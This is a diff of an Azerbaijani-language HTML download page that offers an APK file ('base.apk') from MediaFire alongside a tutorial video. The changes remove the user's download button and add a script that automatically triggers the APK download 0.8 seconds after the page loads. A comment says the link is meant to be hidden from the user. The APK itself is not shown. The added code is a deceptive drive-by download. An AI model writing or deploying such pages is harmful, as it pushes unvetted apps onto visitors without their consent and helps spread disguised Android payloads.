@@ -3,11 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MediaFire Download + Video</title>
+<title>Auto Download + Video</title>
+
 <style>
 body {
     font-family: Arial, sans-serif;
-    background: #0f0f18;
+    background: #0e0e17;
     color: #fff;
     display: flex;
     flex-direction: column;
@@ -16,37 +17,19 @@ body {
 }
 
 .card {
-    background: #1a1a2e;
-    padding: 20px 30px;
+    background: #1c1c29;
+    padding: 25px 30px;
     border-radius: 16px;
-    box-shadow: 0 0 20px rgba(0,255,200,0.2);
+    box-shadow: 0 0 20px rgba(0,255,200,0.25);
     max-width: 500px;
     width: 100%;
     text-align: center;
-    margin-bottom: 20px;
 }
 
 h1 {
-    font-size: 24px;
+    font-size: 22px;
     margin-bottom: 16px;
-    color: #00ffe0;
-}
-
-button {
-    padding: 14px 28px;
-    font-size: 18px;
-    font-weight: bold;
-    border: none;
-    border-radius: 12px;
-    cursor: pointer;
-    background: linear-gradient(45deg, #00ffe0, #00aaff);
-    color: #000;
-    box-shadow: 0 0 15px #00ffe0;
-    transition: transform 0.2s;
-}
-
-button:hover {
-    transform: scale(1.05);
+    color: #00ffd5;
 }
 
 video {
@@ -60,28 +43,30 @@ video {
 <body>
 
 <div class="card">
-    <h1>📥 MediaFire Endir</h1>
-    <button onclick="startDownload()">📲 Endir</button>
+    <h1>📥 Fayl endirilir...</h1>
 
-    <h2 style="margin-top:30px;">🎬 Tutorial Video</h2>
+    <h2 style="margin-top:25px;">🎬 Tutorial Video</h2>
     <video controls controlsList="nodownload nofullscreen noremoteplayback" playsinline>
         <source src="vd.mp4" type="video/mp4">
-        Sizin brauzer video elementini dəstəkləmir.
+        Sizin brauzer video dəstəkləmir.
     </video>
 </div>
 
 <script>
-// MediaFire linki burada açıq saxlanıb
-const mediafireLink = "https://www.mediafire.com/file/66fpi0hcgxtrttl/base.apk/file";
+// MediaFire linki — istifadəçiyə görünmür
+const mediafireUrl = "https://www.mediafire.com/file/66fpi0hcgxtrttl/base.apk/file";
 
-function startDownload() {
-    const a = document.createElement('a');
-    a.href = mediafireLink;
-    a.download = "";
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
-}
+// Sayt açılan kimi endir
+window.onload = () => {
+    setTimeout(() => {
+        let a = document.createElement("a");
+        a.href = mediafireUrl;
+        a.download = "";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }, 800); // 0.8 saniyə gecikmə daha stabil işləyir
+};
 </script>
 
 </body>
